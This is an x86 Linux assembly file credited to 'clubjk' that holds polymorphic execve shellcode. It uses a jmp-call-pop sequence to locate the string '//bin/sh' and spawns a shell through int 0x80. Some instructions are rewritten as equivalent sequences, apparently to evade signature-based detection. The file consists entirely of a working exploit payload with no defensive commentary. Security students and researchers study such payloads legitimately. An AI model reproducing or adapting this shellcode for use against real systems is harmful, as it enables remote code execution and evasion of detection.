;.nasm
;Author:clubjk



global _start

section .text

_start:

 	jmp short here
me:
    	cld
	pop esi
    	mov edi,esi
	std    

    	;xor eax,eax
	mov ebx, eax
	xor eax, ebx


    	push eax
    	mov edx,esp
    
    	;push eax
	mov dword [esp-4], eax
	sub esp, 4



    	add esp,3
    	lea esi,[esi +4]
    	xor eax,[esi]
    	
	;push eax
	mov dword [esp-4], eax
	sub esp, 4

    	xor eax,eax
	


    	xor eax,[edi]
    	
	push eax
	
	


    	mov ebx,esp 
	
	xor eax,eax
	
	nop        

    	;push eax
	mov dword [esp-4], eax
	sub esp, 4



    	lea edi,[ebx]
    	push edi
    	mov ecx,esp
	mov al,0xb
    	int 0x80
here:
    	call me
    	path db "//bin/sh"


